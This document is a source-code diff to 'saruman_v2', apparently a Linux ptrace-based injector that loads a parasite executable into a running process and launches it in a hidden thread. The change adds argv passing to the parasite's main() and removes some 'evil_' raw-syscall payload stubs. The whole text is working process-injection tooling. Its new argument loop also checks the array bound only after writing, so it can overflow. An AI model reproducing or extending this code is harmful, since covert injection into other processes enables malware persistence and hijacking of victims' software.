@@ -1,6 +1,7 @@
 #include <sys/user.h>
 #include <sys/ptrace.h>
 #include <ctype.h>
+#include <sys/wait.h>
 
 #include "saruman_v2.h"
 
@@ -62,8 +63,11 @@ typedef struct saruman_ctx {
 		size_t executable_len;
 	} bootstrap;
 	struct {
+#define MAX_ARGV_LEN 12
 		uint64_t base_vaddr;
 		uint64_t entry_point;
+		char *main_argv[MAX_ARGV_LEN];
+		int main_argc;
 	} parasite;
 	bool bootstrap_phase_complete;
 } saruman_ctx_t;
@@ -109,6 +113,9 @@ __PAYLOAD_KEYWORDS__ void * dlopen_loader(const char *path, uint64_t dlopen_addr
 	__BREAKPOINT__;
 }
 
+/*
+ * Used for debugging when dlopen fails
+ */
 __PAYLOAD_KEYWORDS__ void * dlerror2(uint64_t dlerror_addr)
 {
 	void * (*libc_dlerror)(void) = (void *)((uint64_t)dlerror_addr);
@@ -135,31 +142,6 @@ __PAYLOAD_KEYWORDS__ int evil_read(long fd, char *buf, unsigned long len)
 	return (int)ret;
 }
 
-__PAYLOAD_KEYWORDS__ long evil_open(const char *path, unsigned long flags)
-{
-	long ret;
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov $2, %%rax\n"
-			"syscall" : : "g"(path), "g"(flags));
-
-	asm ("mov %%rax, %0" : "=r"(ret));
-	return ret;
-}
-
-
-__PAYLOAD_KEYWORDS__ int evil_brk(void *addr)
-{
-	long ret;
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov $12, %%rax\n"
-			"syscall" : : "g"(addr));
-	asm("mov %%rax, %0" : "=r"(ret));
-	return (int)ret;
-}
-
 
 __PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
 {
@@ -181,7 +163,8 @@ __PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned lo
 	return (void *)ret;
 }
 
-__PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned long stack)
+__PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data,
+    unsigned long stack, int main_argc, char **main_argv)
 {
 	long retval;
 	void **newstack;
@@ -203,7 +186,7 @@ __PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned 
 		:"=a" (retval)
 		:"0" (__NR_clone),"i" (__NR_exit),
 		 "g" (fn),
-		 "D" (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | SIGCHLD), // | CLONE_THREAD | CLONE_SYSVSEM | CLONE_PARENT_SETTID | CLONE_CHILD_CLEARTID),
+		 "D" (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | SIGCHLD),
 		 "S" (newstack));
 
 	if (retval < 0) {
@@ -641,22 +624,6 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 		break;
 	}
 
-#if DEBUG
-#if 0
-	if (ctx->bootstrap_phase_complete == true) {
-		int i;
-		char tmp[32];
-		saruman_ptrace_read(ctx, tmp, rpc->args[0], 16);
-		saruman_debug("tmp: %s tmp is %zu bytes\n", tmp, strlen(tmp));
-		saruman_debug("dlopen addr: %p\n", rpc->args[1]);
-		saruman_ptrace_read(ctx, tmp, rpc->args[1], 16);
-		for (i = 0; i < 16; i++)
-			printf("%02x", tmp[i] & 0xff);
-		printf("\n");
-	}
-#endif
-#endif
-
 	/*
 	 * Set the new register state
 	 * */
@@ -878,12 +845,13 @@ bool saruman_find_injected_base(struct saruman_ctx *ctx)
 
 int main(int argc, char **argv)
 {
+	char **main_argv;
 	struct saruman_ctx saruman;
 	struct saruman_rpc rpc;
 	uint64_t retval, dlopen_addr, dlerror_addr;
 	struct elf_symbol symbol;
 	bool res;
-	int i;
+	int i, main_argc;
 
 	memset(&saruman, 0, sizeof(saruman));
 
@@ -994,7 +962,7 @@ int main(int argc, char **argv)
 		fprintf(stderr, "elf_symbol_by_name() failed on main\n");
 		exit(EXIT_FAILURE);
 	}
-	saruman.parasite.entry_point = saruman.parasite.base_vaddr + symbol.value; //elf_entry_point(saruman.elfobj);
+	saruman.parasite.entry_point = saruman.parasite.base_vaddr + symbol.value;
 	printf("Entry point of parasite main(): %#lx\n", saruman.parasite.entry_point);
 
 	/*
@@ -1020,11 +988,28 @@ int main(int argc, char **argv)
 	}
 #endif
 
+	/*
+	 * A remote call to creat_thread() will begin execution at main() but we need to have
+	 * the char **argv ascii data stored into remote stack memory before-hand.
+	 */
+	for (i = 0; i < argc - 2; i++) {
+		saruman.parasite.main_argv[i] = (char *)saruman_push_string(&saruman, argv[i + 2]);
+		if (i >= MAX_ARGV_LEN) {
+			fprintf(stderr, "Too many argv entries to main()\n");
+			exit(EXIT_FAILURE);
+		}
+	}
+	saruman.parasite.main_argc = argc - 2;
+	main_argc = saruman.parasite.main_argc;
+	main_argv = saruman.parasite.main_argv;
+
 	printf("Calling create_thread(%p, NULL, %#lx)\n",
 	    (char *)saruman.parasite.entry_point, saruman.stack.rsp);
 
-	char *pthread_args[] = {(char *)saruman.parasite.entry_point, NULL, (char *)saruman.stack.rsp};
-	saruman_remote_call_init(&rpc, &create_thread, 1024, pthread_args, 3);
+	char *pthread_args[] = {(char *)saruman.parasite.entry_point, NULL, (char *)saruman.stack.rsp,
+				(char *)(uint64_t)main_argc, (char *)main_argv};
+				
+	saruman_remote_call_init(&rpc, &create_thread, 1024, pthread_args, 5);
 	if (saruman_remote_call(&saruman, &rpc) == false) {
 		fprintf(stderr, "saruman_remote_call() failed on a remote call to create_thread()\n");
 		exit(EXIT_FAILURE);
